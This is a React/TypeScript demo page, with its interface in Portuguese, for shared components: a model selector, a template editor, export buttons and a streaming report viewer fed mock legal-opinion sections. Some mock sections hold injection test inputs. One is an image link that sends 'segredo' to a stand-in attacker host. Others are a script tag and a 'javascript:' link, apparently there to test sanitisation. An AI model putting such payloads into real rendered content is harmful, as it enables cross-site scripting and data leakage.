"use client";

import { useEffect, useState } from "react";
import { Button } from "@/components/ui/button";
import { ExportButtons } from "@/components/shared/ExportButtons";
import { ModelSelector, type ModelOption } from "@/components/shared/ModelSelector";
import { ReportViewer, type ReportSection } from "@/components/shared/ReportViewer";
import { TemplateEditor } from "@/components/shared/TemplateEditor";
import type { ExportData } from "@/lib/export";
import { formatInstructions, withMandatory, type Template } from "@/lib/templates";

const MOCK_MODELS: ModelOption[] = [
  { id: "anthropic:claude-sonnet-5-5", label: "Claude Sonnet 5.5", provider: "anthropic", providerLabel: "Anthropic", inputPerM: 2, outputPerM: 10 },
  { id: "anthropic:claude-haiku-5-5", label: "Claude Haiku 5.5", provider: "anthropic", providerLabel: "Anthropic", inputPerM: 0.1, outputPerM: 0.5 },
  { id: "google:gemini-3.8-flash", label: "Gemini 3.8 Flash", provider: "google", providerLabel: "Google", inputPerM: 0.75, outputPerM: 3.75 },
  { id: "anthropic:claude-opus-5-5", label: "Claude Opus 5.5", provider: "anthropic", providerLabel: "Anthropic", inputPerM: 4, outputPerM: 20 },
];

const SECTIONS: ReportSection[] = [
  { heading: "Resumo executivo", content: "O contrato é **viável**, com ressalvas de prazo [1]. Veja também a lei [2] e a nota [9] (sem fonte 9).\n\n- Vigência de 12 meses\n- Multa de 0,5% ao dia\n\n> Valores sujeitos a reajuste." },
  { heading: "Fundamentação", content: "A administração pública deve observar a eficiência [1][2].\n\n| Cláusula | Risco |\n|---|---|\n| 4 | Alto |\n| 7 | Médio |\n\n![rastreador](https://atacante.example/?q=segredo) <script>alert(1)</script>" },
  { heading: "Riscos", content: "1. Multa sem teto\n2. Prazo indefinido\n\n[link ruim](javascript:alert(1))" },
];
const CITATIONS = [
  { label: "Lei 14.133/2021 — Nova Lei de Licitações", url: "https://www.planalto.gov.br/ccivil_03/_ato2019-2022/2021/lei/L14133.htm", score: 0.91 },
  { label: "Acórdão TCU 123/2025", url: "https://pesquisa.apps.tcu.gov.br/", score: 0.78 },
];
const DATA: ExportData = {
  title: "Parecer de demonstração — contratação de TI",
  metadata: { Data: "26/10/2026", Modelo: "demo", "Nº de fontes": CITATIONS.length },
  sections: SECTIONS,
  citations: CITATIONS,
};

export function Demo() {
  const [model, setModel] = useState("");
  const [realModel, setRealModel] = useState("");
  const [shown, setShown] = useState(0);
  const [tpl, setTpl] = useState<Template | null>(null);
  const [tplId, setTplId] = useState<string | null>(null);
  const [playing, setPlaying] = useState(false);
  const running = playing && shown < SECTIONS.length;

  useEffect(() => {
    if (!running) return;
    const t = setTimeout(() => setShown((n) => n + 1), 1200);
    return () => clearTimeout(t);
  }, [running, shown]);

  return (
    <main className="mx-auto w-full max-w-5xl space-y-10 p-6">
      <h1 className="text-2xl font-bold">Componentes compartilhados</h1>

      <section className="space-y-3" data-testid="demo-model">
        <h2 className="text-lg font-semibold">ModelSelector</h2>
        <div className="flex flex-wrap items-center gap-4">
          <ModelSelector value={model} onChange={setModel} models={MOCK_MODELS} />
          <code data-testid="model-value" className="text-sm text-text-secondary">{`mock: "${model}"`}</code>
        </div>
        <div className="flex flex-wrap items-center gap-4">
          <ModelSelector value={realModel} onChange={setRealModel} />
          <code data-testid="real-model-value" className="text-sm text-text-secondary">{`API: "${realModel}"`}</code>
        </div>
      </section>

      <section className="space-y-3" data-testid="demo-template">
        <h2 className="text-lg font-semibold">TemplateEditor</h2>
        <TemplateEditor module="demo2_report" value={tpl} onChange={(t, m) => { setTpl(t); setTplId(m.templateId); }} defaultOpen />
        <code data-testid="template-id" className="block text-sm text-text-secondary">{`templateId: ${tplId}`}</code>
        {tpl && <pre data-testid="template-prompt" className="max-h-64 overflow-auto whitespace-pre-wrap rounded-lg border border-border bg-surface p-3 text-xs text-text-secondary">{formatInstructions(withMandatory(tpl, "demo2_report"))}</pre>}
      </section>

      <section className="space-y-3" data-testid="demo-export">
        <h2 className="text-lg font-semibold">ExportButtons</h2>
        <ExportButtons module="demo1" getData={() => DATA} />
      </section>

      <section className="space-y-3" data-testid="demo-report">
        <div className="flex items-center gap-3">
          <h2 className="text-lg font-semibold">ReportViewer</h2>
          <Button size="sm" variant="outline" onClick={() => { setShown(0); setPlaying(true); }}>Simular streaming</Button>
        </div>
        <ReportViewer
          title="Relatório de demonstração"
          sections={running || shown > 0 ? SECTIONS.slice(0, shown) : SECTIONS}
          citations={CITATIONS}
          streaming={running}
          pendingHeadings={running ? SECTIONS.map((s) => s.heading) : []}
        />
      </section>
    </main>
  );
}
